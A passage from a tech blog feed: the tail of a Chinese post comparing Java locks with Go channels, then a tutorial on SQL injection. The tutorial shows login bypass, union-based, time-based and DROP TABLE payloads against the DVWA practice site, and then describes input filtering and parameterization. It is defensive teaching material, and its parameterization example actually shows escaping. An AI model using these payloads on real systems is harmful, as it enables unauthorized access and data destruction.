class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token function&quot;&gt;anotherMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token function&quot;&gt;oneMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;20 行的 Thread 和 25 行的 Thread 彼此等待對方的鎖，讓程式卡住。&lt;br&gt;
而更棘手的是 deadlock 通常不容易發現。想像一下上面的 code：若是 &lt;strong&gt;oneMethod&lt;/strong&gt; 和 &lt;strong&gt;anotherMethod&lt;/strong&gt; 是第三方套件提供的方法，除非你 trace 過 code，不然你無法確保該 method 裡面是否有使用到 lock。甚至有可能在例外處理中忘記解鎖導致系統 deadlock。&lt;/p&gt;
&lt;h1 id=&quot;communicating-sequential-process(csp)&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#communicating-sequential-process(csp)&quot;&gt;#&lt;/a&gt; Communicating Sequential Process(CSP)&lt;/h1&gt;
&lt;p&gt;相較於多個 Thread 透過共享記憶體溝通的 Threa &amp;amp; Lock 典範，CSP 提倡透過溝通來共享資訊。概念上如下圖，每個 Thread 透過 channel 發送/接收訊息來溝通：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/concurrency_paradigms_golang_and_Java/csp.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Golang 的併發典範則是圍繞著 CSP 概念設計，&lt;a href=&quot;https://go.dev/blog/codelab-share&quot;&gt;Golang 官方 blog&lt;/a&gt; 提到:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do not communicate by sharing memory; instead, share memory by communicating.&lt;br&gt;
不要透過共享記憶體溝通，透過溝通來共享記憶體。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;同時你可以在 Golang Sysn Package 的文件中看到下列敘述：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Package sync provides basic synchronization primitives such as mutual exclusion locks. Other than the Once and WaitGroup types, most are intended for use by low-level library routines. Higher-level synchronization is better done via channels and communication.&lt;br&gt;
Package sync 提供基礎的同步原型，像是互斥鎖。除了 Once 和 WaitGroup 以外，大部分都是提供用來做底層 library 使用。高階的同步建議使用 channel 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因此若是用 Golang 解決生產者/消費者問題時，程式寫起來會像這樣：&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	queue &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token comment&quot;&gt;// producer&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			item &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; rand&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Intn&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;			fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Produce: %d\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;			queue &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt; item&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token comment&quot;&gt;// consumer&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			item &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;queue&lt;br&gt;			fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Consume: %d\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到 Golang 將複雜的互斥鎖邏輯封裝在 channel 裡面，開發者可以安心地使用 channel 而不用分心 Lock &amp;amp; Unlock 的邏輯。以更高位的角度來看，可以說是 Golang 鼓勵開發者用 Channel 把所有 Goroutine 解耦合，也就是 CSP 的理念。反之 Thread &amp;amp; Lock 會把所有 thread 用 shared memory 耦合在一起。 &lt;br&gt;
但這是有代價的 - 為了達到 Goroutine 間不共享記憶體，channel 在實作上並不是把 sender 的物件直接透過 channel 傳給 receiver，而是傳遞一個 copy 的物件，可以用下面這段 code 驗證：&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		item &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; rand&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Intn&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Produce item Addr: %v\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		queue &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt; item&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		item &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;queue&lt;br&gt;		fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Consume item Addr: %v\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;實際 print 到銀幕上的記憶體位置會不一樣：&lt;/p&gt;
&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;roduce item Addr: 0xc000014090&lt;br&gt;Consume item Addr: 0xc000120000&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而每個物件都需要 copy 在效能上是一定會有損耗的，這就是用 channel 把 goroutine 解耦合要付出的代價。&lt;/p&gt;
&lt;h1 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; 結論&lt;/h1&gt;
&lt;p&gt;當我們說 Java 的併發是以 Thread &amp;amp; Lock 為基底，並不代表 Java 不能做到 CSP。以生產者/消費者的範例來看， Java 用 BlockingQueue 可以做到類似 Golang 的 channel 的功能。同理，Golang 中也有提供的  sync package 不乏有 Mutext、RWMutex 等機制。&lt;br&gt;
但在 Java 中你會看到 Java 的併發生態系會是環繞著 Thread &amp;amp; Locl 去打造，你會看到大量的 synchronized 去規範某個區段一次只能被一個 Thread 執行，你會看到 Java 文章常提到要 Thread-safe 等概念。而在 Golang 你更多的是看到怎麼運用 select &amp;amp; channel 去打造併發程式。&lt;br&gt;
在下一篇文章中，我會介紹 Golang 官網介紹的幾種常見的 Concurrency Pattern，以及對應 Java 的寫法做比較，讓大家可以更深刻體會兩種併發典範的內涵差異。&lt;/p&gt;
&lt;h1 id=&quot;reference&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#reference&quot;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=KBZlN0izeiY&quot;&gt;GopherCon 2017: Kavya Joshi - Understanding Channels&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://pragprog.com/titles/pb7con/seven-concurrency-models-in-seven-weeks/&quot;&gt;Seven Concurrency Models in Seven Weeks When Threads Unravel&lt;/a&gt;&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>秒懂 SQL Injection</title>
		<link href="https://tech-blog.cymetrics.io/posts/nick/sqli/"/>
		<updated>2021-08-31T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/nick/sqli/</id>
		<content type="html">
		  &lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;現實生活中也可能發生 SQL Injection ? 買飲料的時候店員問你甜度冰塊，你卻跟店員說店長已經連續三個月忘記繳水電費，再不交就要斷水斷電，店員情急之下不疑有他，把盈餘拿出來請你幫忙繳清，你就帶著這筆錢一走了之，SQL Injection 就如同這詐騙一般的行為發生在網站上，開發者沒考慮到意料之外的輸入，駭客趁機對資料庫下命令來竊取或竄改資料，特定狀況下還可以攻到伺服器。&lt;/p&gt;
&lt;h2 id=&quot;%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B&quot;&gt;#&lt;/a&gt; 實際案例&lt;/h2&gt;
&lt;p&gt;SQL Injection 真的已經出現很久了，但它依然不斷發生，這邊分享幾個相關的資安新聞，逐個介紹的話就偏離我們快速了解的目標，先了解其嚴重性即可，如果對 SQL Injection 攻擊所造成的影響有興趣，不仿花點時間看看。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2012年 Yahoo&lt;br&gt;
&lt;a href=&quot;https://www.inside.com.tw/article/1487-yahoo-leaked-450k-accounts&quot;&gt;https://www.inside.com.tw/article/1487-yahoo-leaked-450k-accounts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2015年 Joomla&lt;br&gt;
&lt;a href=&quot;https://thehackernews.com/2015/10/joomla-security.html&quot;&gt;https://thehackernews.com/2015/10/joomla-security.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2021年 中華民國國防部&lt;br&gt;
&lt;a href=&quot;https://udn.com/news/story/10930/5238128&quot;&gt;https://udn.com/news/story/10930/5238128&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;sql-injection-%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F-%3F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#sql-injection-%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F-%3F&quot;&gt;#&lt;/a&gt; SQL Injection 怎麼發生 ?&lt;/h2&gt;
&lt;!-- summary --&gt;
&lt;p&gt;SQL Injection 的原理很簡單，利用網頁程式設計者忽略檢查使用者輸入內容造成攻擊，但只從一句話很難看出到底發生了什麼，下面用生活化的例子，帶大家快速了解整個流程。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;h3 id=&quot;%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B&quot;&gt;#&lt;/a&gt; 正常流程&lt;/h3&gt;
&lt;p&gt;了解攻擊流程之前需要先了解正常網站的作業流程，這邊先用兩張圖來說明。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;網站登入流程&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用戶在頁面上輸入帳號密碼。&lt;/li&gt;
&lt;li&gt;前端將從頁面上將資料整理給後端。&lt;/li&gt;
&lt;li&gt;後段將資料整理成 SQL 格式，向資料庫詢問是否存在一個名稱欄位為 admin 密碼欄位為 password 的使用者，如果存在的話 ID 是多少。&lt;/li&gt;
&lt;li&gt;後端從資料庫找到這個使用者後判斷讓用戶登入。&lt;/li&gt;
&lt;li&gt;前端在頁面上顯示登入成功。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B&quot;&gt;#&lt;/a&gt; 攻擊流程&lt;/h3&gt;
&lt;p&gt;SQL Injection 攻擊的流程，示範如何不用密碼就可登錄網站。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_4.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;網站登入流程(SQL Injection)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用戶輸入帳號密碼。&lt;/li&gt;
&lt;li&gt;前端將資料整理給後端。&lt;br&gt;
&lt;font color=&quot;#FF0000&quot;&gt;&lt;/font&gt;&lt;/li&gt;
&lt;li&gt;後段將資料整理成SQL語法格式，向資料庫詢問是否存在一個名稱欄位為 admin 或 1=1 和密碼為空的使用者，如果存在的話 ID 是多少。&lt;/li&gt;
&lt;li&gt;&lt;font color=&quot;#FF0000&quot;&gt;後端從資料庫找不到這個使用者但因為 1 等於 1 所以讓讓用戶登入。&lt;/font&gt;&lt;/li&gt;
&lt;li&gt;前端在頁面上顯示登入成功。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;從流程中可以看出因為輸入中加上符號後組合成 SQL 語句，影響了步驟 3 的輸入與步驟 4 的判斷，因為與 1=1 取聯集導致查詢一定成立，所以即使密碼錯了也可以成功登入。明顯看出攻擊者透過截斷原本程式的語意，插入他希望執行的 SQL 語法，達成攻擊的效果。&lt;/p&gt;
&lt;h2 id=&quot;sql-injection-%E6%9C%89%E5%93%AA%E4%BA%9B%E7%A8%AE%E9%A1%9E-%3F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#sql-injection-%E6%9C%89%E5%93%AA%E4%BA%9B%E7%A8%AE%E9%A1%9E-%3F&quot;&gt;#&lt;/a&gt; SQL Injection 有哪些種類 ?&lt;/h2&gt;
&lt;p&gt;看懂攻擊原理後是否感覺 SQL Injection 其實很單純 ? 可惜在實務較為複雜，當開發者想出了方法來保護資料庫後，駭客會在想出新的攻擊手法來繞過，在這互相競爭的過程中，衍伸出各種花式攻擊，我們通常依攻擊手法分成 3 大類，接著利用知名的靶站 DVWA 做一個簡單的示範。&lt;/p&gt;
&lt;h3 id=&quot;1.-in-band-sql-injection&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#1.-in-band-sql-injection&quot;&gt;#&lt;/a&gt; 1. In-band SQL Injection&lt;/h3&gt;
&lt;p&gt;最常見和最容易被利用的一種。攻擊者藉由插入 SQL 語法來從資料庫收集資訊，以攻擊方式來看又可再細分為兩個小類別。&lt;/p&gt;
&lt;p&gt;在了解攻擊之前還是要先了解正常運作的狀況，範例中是一個查詢頁面，輸入整數的 ID 可以顯示出對應的人員名稱。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_5.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Error-based&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;簡介: 藉由錯誤訊息來取得想要的資訊。&lt;/li&gt;
&lt;li&gt;攻擊範例: &lt;code&gt;&#39;&lt;/code&gt; (別懷疑你沒看錯，只要一個符號就可能導致問題)&lt;/li&gt;
&lt;li&gt;測試結果: 藉由錯誤訊息來取得資料庫的類型，以便於之後針對性的攻擊。&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_6.jpg&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Union-based&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;簡介: 將多筆查詢的結果藉由 UNION 語法合併到單次查詢中，藉此查詢原本不提供的資訊。&lt;/li&gt;
&lt;li&gt;攻擊範例:&lt;code&gt;&#39; union all select system_user(),user() #&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;測試結果: 在原本的查詢內容之外加上對伺服器用戶的查詢，範例中成功的找出使用者(app@localhost)。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_7.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;2.-inference-(blind)-sql-injection&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#2.-inference-(blind)-sql-injection&quot;&gt;#&lt;/a&gt; 2. Inference (Blind) SQL Injection&lt;/h3&gt;
&lt;p&gt;部分頁面輸入後並不像查尋頁面會直接顯示從資料庫來的資料，甚至根本沒有回應 ! 所以攻擊者需要靠其他資訊來攻擊，因為大多數狀況下要靠反複猜測來猜取資料內容，這類型攻擊又常被稱為盲測，以攻擊方式來看又可再細分為兩個小類別，分別對應網站有回應跟沒有回應的兩種狀況。&lt;/p&gt;
&lt;p&gt;在了解攻擊之前還是要先了解正常運作的狀況，範例中是一個查詢頁面，輸入整數的 ID 之後網站會告訴你這個 ID 在資料庫中資否存在，所以只會回應有跟沒有，不會直接顯示從資料庫中得到的資料。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_8.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Content-based&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;簡介: 從頁面的內容來判斷攻擊是否成功，故需能從頁面上看出反應。&lt;/li&gt;
&lt;li&gt;攻擊範例: &lt;code&gt;&#39; ; DROP table USERS ; --&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;測試結果: 查詢 ID = 1 的使用者已不存在，代表攻擊已成功刪除 table。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_9.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Time-based&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;簡介: 從等待時間來判斷攻擊是否成功。&lt;/li&gt;
&lt;li&gt;攻擊範例: &lt;code&gt;1&#39; and sleep(5)#&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;測試結果: 可從左上角可判斷出網站正在等待，藉由檢查等待時間是否為 5 秒來判斷攻擊時否成功，成功代表可做 Time-based 相關的進階測試。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_10.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;3.-out-of-band-sql-injection&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#3.-out-of-band-sql-injection&quot;&gt;#&lt;/a&gt; 3. Out-of-band SQL Injection&lt;/h3&gt;
&lt;p&gt;該類因為攻擊前置需求比較高，所以比較少發生，攻擊方式主要是透過 SQL Injection 來攻擊與資料庫有串連的系統，像是 DNS Server、文件系統、電子郵件等等，所以攻擊方式取決於後面有串那些系統，本次測試靶站利用 docker 架的環境相對單純，沒有這類型的問題。&lt;/p&gt;
&lt;p&gt;發生機會低不代表問題不會發生，因為缺範例這邊補上一篇近期從 SQL 打到 DNS 的資安新聞。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.cna.com.tw/news/aipl/202101270075.aspx&quot; title=&quot;Title&quot;&gt;政府網路遇襲上月近10萬件 非核心系統也成目標&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/nick/sqli/sqli_11.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90%3A&quot;&gt;#&lt;/a&gt; 總結:&lt;/h2&gt;
&lt;p&gt;SQL Injection 畢竟是由使用者輸入所導致的問題，要解決當然也要從輸入下手。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解決方案（一） :  輸入過濾&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;過濾輸入是最常見的防範方法，藉由檢查 SQL 語法中有意義的符號來避免語意被竄改，但要特別注意兩點，第一是必須在後端進行過濾，因為駭客有太多機會繞過前端檢查，第二是避免用黑名單的方式過濾，因為駭客會嘗試用合法的字元來組合出該被過濾掉的符號，用白名單可以將這個問題的發生機率降到最低，不過白名單只適合用在輸入較為單純的網站，如果網站的輸入較複雜或者必須包含符號，建議改用其他方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解決方案（二） :  參數化&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;限制輸入僅含參數不含語法，接著在輸入後立刻轉換輸入格式。&lt;/p&gt;
&lt;p&gt;以開頭的免密碼登入攻擊來舉例，實際上資料庫收到的 SQL 語句如下。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT ID FROM Accounts WHERE user =&#39;admin or &#39;1&#39;=1&#39; and &#39;pass&#39;=&#39;&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果在先轉換輸入內容轉換為字串再放入 SQL 語句。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT ID FROM Accounts WHERE user=&amp;quot;admin\&#39; or \&#39;1\&#39;=\&#39;1&amp;quot; and &#39;pass&#39;=&amp;quot;&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這時會去檢查有沒有一個名稱為 &lt;font color=&quot;#FF0000&quot;&gt;admin&#39; or &#39;1&#39;=&#39;1 &lt;/font&gt;的帳號，結果當然是找不到攻擊也失效，這種方法比較通用，不過要注意轉換失敗時的例外處理，部分程式語言會直接 crash，影響到網站服務。&lt;/p&gt;
